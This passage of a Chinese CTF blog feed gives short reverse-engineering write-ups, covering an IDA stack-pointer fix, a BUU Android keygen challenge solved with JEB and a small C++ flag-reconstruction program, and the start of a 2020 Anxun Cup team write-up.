&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/ida-%E8%B0%83%E6%95%B4%E6%A0%88%E5%B8%A7-411a04positive-sp-value-has-been-found/1858293-20200912183238756-1398928788.png&#34;
	width=&#34;627&#34;
	height=&#34;151&#34;
	srcset=&#34;https://dorinxl.github.io/p/ida-%E8%B0%83%E6%95%B4%E6%A0%88%E5%B8%A7-411a04positive-sp-value-has-been-found/1858293-20200912183238756-1398928788_hu18289208281058740469.png 480w, https://dorinxl.github.io/p/ida-%E8%B0%83%E6%95%B4%E6%A0%88%E5%B8%A7-411a04positive-sp-value-has-been-found/1858293-20200912183238756-1398928788_hu7930557897210963221.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20200912182838735&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;415&#34;
		data-flex-basis=&#34;996px&#34;
	
&gt;
 &lt;/p&gt;
&lt;h1 id=&#34;第四步-altk-盘他&#34;&gt;第四步 ALT+K 盘他
&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/ida-%E8%B0%83%E6%95%B4%E6%A0%88%E5%B8%A7-411a04positive-sp-value-has-been-found/1858293-20200912183238990-1993466945.png&#34;
	width=&#34;940&#34;
	height=&#34;201&#34;
	srcset=&#34;https://dorinxl.github.io/p/ida-%E8%B0%83%E6%95%B4%E6%A0%88%E5%B8%A7-411a04positive-sp-value-has-been-found/1858293-20200912183238990-1993466945_hu5564694291972872441.png 480w, https://dorinxl.github.io/p/ida-%E8%B0%83%E6%95%B4%E6%A0%88%E5%B8%A7-411a04positive-sp-value-has-been-found/1858293-20200912183238990-1993466945_hu1100410090465928113.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20200912182929387&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;467&#34;
		data-flex-basis=&#34;1122px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;如果不知道改成多少的话可以一次一次尝试反正把最下面的-04改成0以上就能f5了&#34;&gt;如果不知道改成多少的话，可以一次一次尝试，反正把最下面的-04改成0以上就能F5了。
&lt;/h3&gt;</description>
        </item>
        <item>
        <title>【BUU】简单注册器</title>
        <link>https://dorinxl.github.io/p/buu%E7%AE%80%E5%8D%95%E6%B3%A8%E5%86%8C%E5%99%A8/</link>
        <pubDate>Sat, 12 Sep 2020 00:00:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/buu%E7%AE%80%E5%8D%95%E6%B3%A8%E5%86%8C%E5%99%A8/</guid>
        <description>&lt;h6 id=&#34;主要记录一下第一次使用jeb的过程题目本身还是蛮简单的&#34;&gt;主要记录一下第一次使用jeb的过程，题目本身还是蛮简单的。
&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
&lt;h1 id=&#34;1-下载jeb&#34;&gt;1. 下载JEB
&lt;/h1&gt;&lt;h3 id=&#34;在52的爱盘里就有&#34;&gt;在52的爱盘里就有。
&lt;/h3&gt;&lt;p&gt; &lt;/p&gt;
&lt;h1 id=&#34;2-配置jdk&#34;&gt;2. 配置JDK
&lt;/h1&gt;&lt;h3 id=&#34;jeb支持的jdk版本是121及以下用最新的打开jeb会出现奇怪的问题&#34;&gt;JEB支持的JDK版本是121及以下，用最新的打开JEB会出现奇怪的问题。
&lt;/h3&gt;&lt;h6 id=&#34;可以百度找jdk-8u121-windows-x64exe&#34;&gt;可以百度找jdk-8u121-windows-x64.exe
&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
&lt;h1 id=&#34;3-修改jeb_winconbat的内容&#34;&gt;3 .修改jeb_wincon.bat的内容
&lt;/h1&gt;&lt;h3 id=&#34;我是在windows上装的jeb其还支持linux和mac&#34;&gt;我是在windows上装的jeb，其还支持linux和mac
&lt;/h3&gt;&lt;h3 id=&#34;只要添加一句set-java_home--你安装jdk的路径就可&#34;&gt;只要添加一句set JAVA_HOME = 你安装jdk的路径就可
&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/buu%E7%AE%80%E5%8D%95%E6%B3%A8%E5%86%8C%E5%99%A8/1858293-20200912103752397-1035092193.png&#34;
	width=&#34;775&#34;
	height=&#34;457&#34;
	srcset=&#34;https://dorinxl.github.io/p/buu%E7%AE%80%E5%8D%95%E6%B3%A8%E5%86%8C%E5%99%A8/1858293-20200912103752397-1035092193_hu5835180158202511279.png 480w, https://dorinxl.github.io/p/buu%E7%AE%80%E5%8D%95%E6%B3%A8%E5%86%8C%E5%99%A8/1858293-20200912103752397-1035092193_hu12782237075075285190.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20200912092423703&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;169&#34;
		data-flex-basis=&#34;407px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h1 id=&#34;4-双击jeb_winconbat开始运行&#34;&gt;4. 双击jeb_wincon.bat开始运行
&lt;/h1&gt;&lt;h3 id=&#34;到这里就可以打开jeb了&#34;&gt;到这里就可以打开jeb了。
&lt;/h3&gt;&lt;p&gt; &lt;/p&gt;
&lt;h1 id=&#34;5-分析源码&#34;&gt;5. 分析源码
&lt;/h1&gt;&lt;h3 id=&#34;加载文件把反汇编选项打开核心内容就这一点&#34;&gt;加载文件，把反汇编选项打开，核心内容就这一点：
&lt;/h3&gt;&lt;h3 id=&#34;image-202009121035210981858293-20200912103752698-704064669png&#34;&gt;&lt;img src=&#34;https://dorinxl.github.io/p/buu%E7%AE%80%E5%8D%95%E6%B3%A8%E5%86%8C%E5%99%A8/1858293-20200912103752698-704064669.png&#34;
	width=&#34;906&#34;
	height=&#34;650&#34;
	srcset=&#34;https://dorinxl.github.io/p/buu%E7%AE%80%E5%8D%95%E6%B3%A8%E5%86%8C%E5%99%A8/1858293-20200912103752698-704064669_hu5744435940794796139.png 480w, https://dorinxl.github.io/p/buu%E7%AE%80%E5%8D%95%E6%B3%A8%E5%86%8C%E5%99%A8/1858293-20200912103752698-704064669_hu3899583825063768093.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20200912103521098&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;139&#34;
		data-flex-basis=&#34;334px&#34;
	
&gt;
&lt;/h3&gt;&lt;p&gt; &lt;/p&gt;
&lt;h1 id=&#34;6-解出flag&#34;&gt;6. 解出flag
&lt;/h1&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&amp;lt;iostream&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;using&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;namespace&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;std&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v9&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v11&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;31&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;dd2940c04462b4dd7c450528835cca15&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;v5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v9&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v9&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;50&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;v5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v9&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;48&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;v5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;30&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v11&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;48&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;v5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;14&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;27&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;28&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;97&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v4&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v4&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v0&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;31&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;v5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;31&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;v5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    	&lt;span class=&#34;n&#34;&gt;cout&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;flag{59acc538825054c7de4b26440c0999dd}&lt;/p&gt;
</description>
        </item>
        <item>
        <title>2020年“安洵杯”四川省大学生信息安全技术大赛  部分WRITEUP</title>
        <link>https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/</link>
        <pubDate>Tue, 08 Sep 2020 14:36:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/</guid>
        <description>&lt;p&gt;&lt;strong&gt;2020年&amp;quot;安洵杯&amp;quot;四川省大学生信息安全技术大赛&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;部分 WRITEUP&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;一、战队信息&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;战队名称：&lt;strong&gt;成都理工大学二队&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;战队排名：第八名 743分&lt;/p&gt;
&lt;h2 id=&#34;二解题情况&#34;&gt;二、解题情况
&lt;/h2&gt;&lt;p&gt;第一天：web两道、misc一道、pwn一道&lt;/p&gt;
&lt;p&gt;第二天：攻下两处、misc一到、密码一道&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;三、解题过程&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;由于我是逆向选手，而这次逆向完全没有做出来，倒是做出来个pwn，剩下的时间就是钻misc和密码，所以我仅列出我个人做出来的题目。还望各位大佬轻喷。&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;1-北二街恰醉鸡fakepwn&#34;&gt;1 北二街恰醉鸡（fakepwn）
&lt;/h3&gt;&lt;h3 id=&#34;操作内容&#34;&gt;操作内容：
&lt;/h3&gt;&lt;p&gt;IDA进入main函数，找到granblue()函数，进入。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223206966-1352347785.png&#34;
	width=&#34;170&#34;
	height=&#34;68&#34;
	srcset=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223206966-1352347785_hu16606217302720647512.png 480w, https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223206966-1352347785_hu8102859921409897096.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;250&#34;
		data-flex-basis=&#34;600px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;里面有很多数据，其中一串最显眼：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223212418-1381951914.png&#34;
	width=&#34;221&#34;
	height=&#34;510&#34;
	srcset=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223212418-1381951914_hu8201028856986287339.png 480w, https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223212418-1381951914_hu17031471701718579158.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;43&#34;
		data-flex-basis=&#34;104px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;转换成字符格式：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223213209-2001509690.png&#34;
	width=&#34;111&#34;
	height=&#34;107&#34;
	srcset=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223213209-2001509690_hu11841180098490586298.png 480w, https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223213209-2001509690_hu871187240068468482.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;103&#34;
		data-flex-basis=&#34;248px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;得到flag&lt;/p&gt;
&lt;h3 id=&#34;flag值&#34;&gt;flag值：
&lt;/h3&gt;&lt;h3 id=&#34;flagac3850d256c1842f-&#34;&gt;flag{ac3850d256c1842f }
&lt;/h3&gt;&lt;h3 id=&#34;2-开始抑郁&#34;&gt;2 开始抑郁
